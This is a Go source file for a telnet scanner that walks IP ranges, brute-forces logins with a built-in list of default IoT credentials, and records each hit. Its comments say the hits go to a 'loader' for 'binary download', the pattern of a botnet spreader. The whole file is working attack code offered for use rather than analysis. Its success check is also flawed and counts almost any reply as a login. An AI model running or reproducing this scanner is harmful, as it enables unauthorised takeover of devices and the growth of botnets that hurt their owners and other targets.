package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// TelnetScanner - Server-side telnet scanner with rate limiting
// Scans IP ranges for telnet access, tries common credentials
// Reports findings back to loader for binary download
type TelnetScanner struct {
	rateLimit   time.Duration
	workerCount int
	results     chan ScanResult
	credentials []Credential
	running     bool
	mu          sync.Mutex
}

type Credential struct {
	Username string
	Password string
}

type ScanResult struct {
	IP       string
	Port     int
	Username string
	Password string
}

// Common telnet credentials
var defaultCredentials = []Credential{
	{"root", "root"},
	{"admin", "admin"},
	{"root", "admin"},
	{"admin", "root"},
	{"root", "123456"},
	{"admin", "123456"},
	{"root", "password"},
	{"admin", "password"},
	{"root", ""},
	{"admin", ""},
	{"guest", "guest"},
	{"support", "support"},
	{"user", "user"},
	{"ubnt", "ubnt"},
	{"root", "1234"},
	{"admin", "1234"},
	{"root", "toor"},
	{"admin", "changeme"},
	{"root", "changeme"},
	{"default", "default"},
}

func NewTelnetScanner(rateLimit time.Duration, workers int) *TelnetScanner {
	return &TelnetScanner{
		rateLimit:   rateLimit,
		workerCount: workers,
		results:     make(chan ScanResult, 1000),
		credentials: defaultCredentials,
	}
}

func (s *TelnetScanner) Start() {
	s.mu.Lock()
	s.running = true
	s.mu.Unlock()

	fmt.Printf("[Scanner] Telnet scanner started with %d workers\n", s.workerCount)

	for i := 0; i < s.workerCount; i++ {
		go s.worker(i)
	}
}

func (s *TelnetScanner) Stop() {
	s.mu.Lock()
	s.running = false
	s.mu.Unlock()
	fmt.Println("[Scanner] Telnet scanner stopped")
}

func (s *TelnetScanner) ScanIPRange(startIP, endIP string, port int) {
	fmt.Printf("[Scanner] Scanning %s:%d to %s:%d\n", startIP, port, endIP, port)

	start := ipToInt(startIP)
	end := ipToInt(endIP)

	for ip := start; ip <= end && s.isRunning(); ip++ {
		ipStr := intToIP(ip)
		s.scanTarget(ipStr, port)
		time.Sleep(s.rateLimit)
	}
}

func (s *TelnetScanner) ScanTarget(ip string, port int) {
	s.scanTarget(ip, port)
}

func (s *TelnetScanner) scanTarget(ip string, port int) {
	if !s.isRunning() {
		return
	}

	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Try each credential
	for _, cred := range s.credentials {
		if s.tryLogin(conn, ip, port, cred) {
			return // Found valid credentials, move to next IP
		}
		// Reconnect for next attempt
		conn.Close()
		conn, err = net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			return
		}
		conn.SetDeadline(time.Now().Add(10 * time.Second))
	}
}

func (s *TelnetScanner) tryLogin(conn net.Conn, ip string, port int, cred Credential) bool {
	reader := bufio.NewReader(conn)

	// Wait for telnet banner
	time.Sleep(500 * time.Millisecond)

	// Send username
	fmt.Fprintf(conn, "%s\r\n", cred.Username)
	time.Sleep(300 * time.Millisecond)

	// Check for password prompt
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := reader.Read(buf)
	response := string(buf[:n])

	if strings.Contains(strings.ToLower(response), "password") ||
		strings.Contains(strings.ToLower(response), "pass") {
		// Send password
		fmt.Fprintf(conn, "%s\r\n", cred.Password)
		time.Sleep(500 * time.Millisecond)

		// Check for successful login
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, _ = reader.Read(buf)
		response = string(buf[:n])

		// Check for shell prompt indicators
		if strings.Contains(response, "#") ||
			strings.Contains(response, "$") ||
			strings.Contains(response, ">") ||
			strings.Contains(strings.ToLower(response), "login incorrect") == false {

			result := ScanResult{
				IP:       ip,
				Port:     port,
				Username: cred.Username,
				Password: cred.Password,
			}
			s.results <- result
			fmt.Printf("[+] Found: %s:%d %s:%s\n", ip, port, cred.Username, cred.Password)
			return true
		}
	}

	return false
}

func (s *TelnetScanner) worker(id int) {
	fmt.Printf("[Scanner] Worker %d started\n", id)
	for s.isRunning() {
		time.Sleep(100 * time.Millisecond)
	}
	fmt.Printf("[Scanner] Worker %d stopped\n", id)
}

func (s *TelnetScanner) isRunning() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.running
}

func (s *TelnetScanner) GetResults() <-chan ScanResult {
	return s.results
}

// IP conversion utilities
func ipToInt(ip string) uint32 {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return 0
	}
	var result uint32
	for i, part := range parts {
		var val uint32
		fmt.Sscanf(part, "%d", &val)
		result |= val << (24 - i*8)
	}
	return result
}

func intToIP(ip uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		(ip>>24)&0xFF,
		(ip>>16)&0xFF,
		(ip>>8)&0xFF,
		ip&0xFF)
}

// Load IPs from file for scanning
func LoadIPsFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			ips = append(ips, line)
		}
	}
	return ips, scanner.Err()
}

// Write results to file for loader to process
func WriteResultsToFile(filename string, results []ScanResult) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	for _, r := range results {
		fmt.Fprintf(file, "%s:%d %s:%s\n", r.IP, r.Port, r.Username, r.Password)
	}
	return nil
}
